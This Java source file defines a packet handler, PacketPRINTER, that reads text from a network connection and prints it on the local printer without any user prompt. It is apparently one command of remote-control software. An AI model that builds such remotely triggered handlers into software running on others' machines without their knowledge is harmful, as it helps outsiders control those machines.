package com.redpois0n.packets;

import javax.swing.JTextPane;

import com.redpois0n.Connection;


public class PacketPRINTER extends Packet {

	@Override
	public void read(String line) throws Exception {
		String toprint = Connection.readLine();
		JTextPane c = new JTextPane();
		c.setText(toprint);
		c.print();
	}

}
